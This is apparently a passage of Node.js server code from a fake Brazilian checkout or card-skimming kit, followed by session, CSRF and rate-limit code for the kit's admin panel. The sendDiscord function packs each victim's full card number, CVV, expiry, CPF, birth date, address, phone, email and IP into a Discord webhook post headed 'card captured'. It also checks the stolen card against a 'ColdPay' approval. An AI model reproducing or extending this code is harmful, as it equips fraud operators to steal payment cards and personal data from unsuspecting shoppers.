async function sendDiscord(cfg,cap,gw){ const url=cfg.webhook; if(!url){ console.log('[discord] sem webhook',cap.id); return{ok:false,note:'sem webhook'} }
  const full=cfg.full_pan!==false, isPix=cap.tipo==='pix'
  const cl=[cap.cliente.nome,cap.cliente.email,cap.cliente.telefone&&('tel: '+cap.cliente.telefone),cap.cliente.cpf&&('CPF: '+cap.cliente.cpf),cap.cliente.nascimento&&('Nascimento: '+fmtNasc(cap.cliente.nascimento)+(cap.cliente.idade!=null?' ('+cap.cliente.idade+' anos)':''))].filter(Boolean).join('\n')||'—'
  const en=(cap.cliente.endereco||{}); const end=[en.cep&&(en.cep+' · '+[en.logradouro,en.numero].filter(Boolean).join(', ')+(en.complemento?' '+en.complemento:'')),en.bairro,[en.cidade,en.uf].filter(Boolean).join(' / ')].filter(Boolean).join('\n')||'—'
  let lines=[]
  if(isPix){ lines.push('🆔 '+cap.pix.id); if(cap.pix.copia)lines.push('Copia-e-cola:\n'+cap.pix.copia) }
  else if(cap.card){ lines.push('💳 '+(full?fmtPan(cap.card.num,true):fmtPan(cap.card.num,false))); lines.push('🏷️  '+cap.card.brand); lines.push('⏳  '+String(cap.card.expMonth).padStart(2,'0')+'/'+String(cap.card.expYear%100).padStart(2,'0')); lines.push('🔒  CVV '+cap.card.cvv) } else { lines.push('💳 (número inválido)') }
  if(cap.menor) lines.push('⚠️  MENOR DE IDADE'); if(cap.coldpay) lines.push('❄️ ColdPay ['+(cap.coldpay.ok?'APPROVED':'RECUSADO')+'] '+(cap.coldpay.status||'')+(cap.coldpay.id?(' #'+String(cap.coldpay.id).slice(0,16)):'')+(cap.coldpay.msg?(' · '+String(cap.coldpay.msg).slice(0,150)):''))
  const items=(cap.pedido?.itens||[]).map(i=>'• '+(i.qty||1)+'× '+(i.nome)+' — R$ '+((i.preco||0).toFixed(2).replace('.',','))).join('\n')||'—'
  const embed={ title:isPix?(cap.status==='aprovado'?'✅ PIX PAGO':(cap.status==='pendente'?'🟡 PIX capturado · aguardando pagamento':'🟢 PIX capturado')):'💳 Cartão de crédito capturado', color:isPix?(cap.status==='aprovado'?0x22c55e:(cap.status==='pendente'?0xf5a623:0x22c55e)):0x6c63ff, description:'```\n'+lines.join('\n')+'\n```',
    fields:[ {name:'Cliente',value:cl,inline:true}, {name:'Endereço',value:end,inline:true},
      {name:'Pedido',value:items+'\n**Total: R$ '+((cap.total||0).toFixed(2).replace('.',','))+'**',inline:false},
      {name:'Gateway',value:(gw.mode)+(gw.ok?' ✅':((gw.error)?' ❌ '+gw.error:''))+(gw.id?(' · '+gw.id):''),inline:false},...(cap.cardStatus?[{name:'Status do cartão',value:cap.cardStatus.toUpperCase()+(cap.cardNote?(' · '+cap.cardNote):''),inline:false}]:[]),
      {name:'Origem',value:'IP: '+(cap.ip||'—')+'\nUA: '+((cap.ua||'').slice(0,90)||'—'),inline:false} ],
    footer:{text:'#'+String(cap.seq).padStart(4,'0')}, timestamp:new Date().toISOString() }
  try{ const r=await fetch(url,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({username:cfg.bot_name||DEFAULT_CONFIG.bot_name,embeds:[embed]})}); return{ok:r.ok,status:r.status} } catch(e){ return{ok:false,error:String(e.message||e)} } }

/* ── sessão / auth ── */
const SECRET=uid()+'::'+INITIAL_PASSWORD
const sessions={}
function sign(v){ return v+'.'+crypto.createHmac('sha256',SECRET).update(v).digest('hex') }
function unsign(v){ const i=v.lastIndexOf('.'); if(i<0)return null; const body=v.slice(0,i),h=v.slice(i+1); return crypto.createHmac('sha256',SECRET).update(body).digest('hex')===h?body:null }
function cookieVal(sid){ return 'vc_admin='+sign(sid)+'; HttpOnly; SameSite=Lax'+(SECURE?'; Secure':'')+'; Path=/; Max-Age='+SESSION_HOURS*3600 }
function getCookies(req){ const out={}; const h=req.headers.cookie; if(!h)return out; for(const p of h.split(';')){const i=p.indexOf('=');if(i<0)continue;out[p.slice(0,i).trim()]=decodeURIComponent(p.slice(i+1).trim())} return out }
function currentSession(req){ const v=getCookies(req).vc_admin; if(!v)return null; const sid=unsign(v); if(!sid)return null; const s=sessions[sid]; if(!s)return null; if(Date.now()-s.iat>SESSION_HOURS*3600*1000){ delete sessions[sid]; return null } return {sid,csrf:s.csrf,user:s.user||{name:'Admin',uname:ADMIN_USERNAME}} }
function requireAdmin(req,res,next){ if(!adminAllowed(clientIp(req))) return res.status(404).end(); const s=currentSession(req); if(!s) return res.status(401).json({ok:false,unauthorized:true}); res.locals.session=s; next() }
function requireCsrf(req,res,next){ const s=res.locals.session; const t=req.headers['x-csrf-token']; if(!t||t!==s.csrf) return res.status(419).json({ok:false,error:'Sessão expirada. Entre novamente.'}); next() }
function actor(res){ try{ return (res.locals.session&&res.locals.session.user?res.locals.session.user.uname:'?') }catch(e){return '?'} }
const rl={};
function rate(ip,max,failMs,fails){ const t=Date.now(); const b=rl[ip]||(rl[ip]={c:0,r:t+60000,fails:[]}); if(t>b.r){b.c=0;b.r=t+60000} b.c++; const f=b.fails.filter(x=>t-x<failMs); b.fails=f; if(f.length>=fails) return {ok:false,code:'locked'}; if(b.c>max) return {ok:false,code:'too-many'}; return {ok:true} }
function noteFail(ip){ const b=rl[ip]||(rl[ip]={c:0,r:Date.now()+60000,fails:[]}); b.fails.push(Date.now()) }

